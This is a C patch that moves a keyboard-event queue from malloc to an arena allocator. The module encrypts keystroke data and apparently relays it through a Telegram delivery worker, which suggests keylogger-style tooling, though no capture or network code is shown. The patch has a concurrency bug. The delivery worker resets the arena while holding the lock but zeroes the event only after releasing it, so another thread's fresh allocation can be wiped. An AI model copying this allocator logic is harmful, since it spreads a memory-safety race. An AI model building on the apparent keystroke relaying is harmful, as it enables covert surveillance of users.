@@ -18,6 +18,7 @@
 #include "keyboard.h"
 #include "keyboard_output.h"
 #include "../config/config.h"
+#include "../crypto/arena.h"
 #include "../crypto/crypto.h"
 #include "../logging/logging.h"
 #include "../telegram/telegram.h"
@@ -134,6 +135,8 @@ static void retry_delay(size_t attempt)
 #endif
 }
 
+static c2t_arena_t keyboard_arena;
+
 static void enqueue_locked(const void *data, size_t length)
 {
     if (length == 0)
@@ -150,7 +153,16 @@ static void enqueue_locked(const void *data, size_t length)
         return;
     }
 
-    keyboard_event_t *event = malloc(allocation_size);
+    keyboard_event_t *event = (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
+    if (!event) {
+        if (queue_items == 0) {
+            c2t_arena_reset(&keyboard_arena);
+            event = (keyboard_event_t *)c2t_arena_alloc(&keyboard_arena, allocation_size);
+        }
+    }
+    if (!event) {
+        event = malloc(allocation_size);
+    }
     if (!event) {
         c2t_log_error("keyboard", "Out of memory allocating keyboard event");
         return;
@@ -162,12 +174,24 @@ static void enqueue_locked(const void *data, size_t length)
 
     if (!c2t_crypto_get_random_bytes(event->nonce, C2T_CRYPTO_NONCE_SIZE)) {
         c2t_log_error("keyboard", "Failed to generate nonce for keyboard event");
-        free(event);
+        if ((unsigned char *)event >= keyboard_arena.buffer &&
+            (unsigned char *)event < keyboard_arena.buffer + keyboard_arena.capacity) {
+            c2t_secure_zero(event, allocation_size);
+        } else {
+            c2t_secure_zero(event, allocation_size);
+            free(event);
+        }
         return;
     }
     if (!c2t_crypto_encrypt(data, length, event->nonce, event->encrypted_data)) {
         c2t_log_error("keyboard", "Encryption failed for keyboard payload");
-        free(event);
+        if ((unsigned char *)event >= keyboard_arena.buffer &&
+            (unsigned char *)event < keyboard_arena.buffer + keyboard_arena.capacity) {
+            c2t_secure_zero(event, allocation_size);
+        } else {
+            c2t_secure_zero(event, allocation_size);
+            free(event);
+        }
         return;
     }
 
@@ -343,10 +367,18 @@ static void *delivery_worker([[maybe_unused]] void *context)
             queue_lock();
             queue_bytes -= event->allocation_size;
             --queue_items;
+            if (queue_items == 0) {
+                c2t_arena_reset(&keyboard_arena);
+            }
             queue_unlock();
 
-            c2t_secure_zero(event, event->allocation_size);
-            free(event);
+            if ((unsigned char *)event >= keyboard_arena.buffer &&
+                (unsigned char *)event < keyboard_arena.buffer + keyboard_arena.capacity) {
+                c2t_secure_zero(event, event->allocation_size);
+            } else {
+                c2t_secure_zero(event, event->allocation_size);
+                free(event);
+            }
         } else {
             queue_unlock();
         }
@@ -478,6 +510,8 @@ int keyboard_output_init(void)
     text_buffer_len = 0;
     last_key_time_ms = 0;
 
+    (void)c2t_arena_init(&keyboard_arena, 64U * 1024U);
+
 #ifdef _WIN32
     InitializeCriticalSection(&queue_mutex);
     InitializeConditionVariable(&queue_condition);
@@ -494,6 +528,7 @@ int keyboard_output_init(void)
 
     if (!worker_started) {
         c2t_log_error("keyboard", "Unable to start keyboard delivery worker");
+        c2t_arena_destroy(&keyboard_arena);
 #ifdef _WIN32
         DeleteCriticalSection(&queue_mutex);
 #endif
@@ -524,8 +559,12 @@ void keyboard_output_cleanup(void)
         keyboard_event_t *event = queue_head;
         queue_head = event->next;
         c2t_secure_zero(event, event->allocation_size);
-        free(event);
+        if ((unsigned char *)event < keyboard_arena.buffer ||
+            (unsigned char *)event >= keyboard_arena.buffer + keyboard_arena.capacity) {
+            free(event);
+        }
     }
+    c2t_arena_destroy(&keyboard_arena);
     queue_tail = nullptr;
     queue_bytes = 0;
     queue_items = 0;
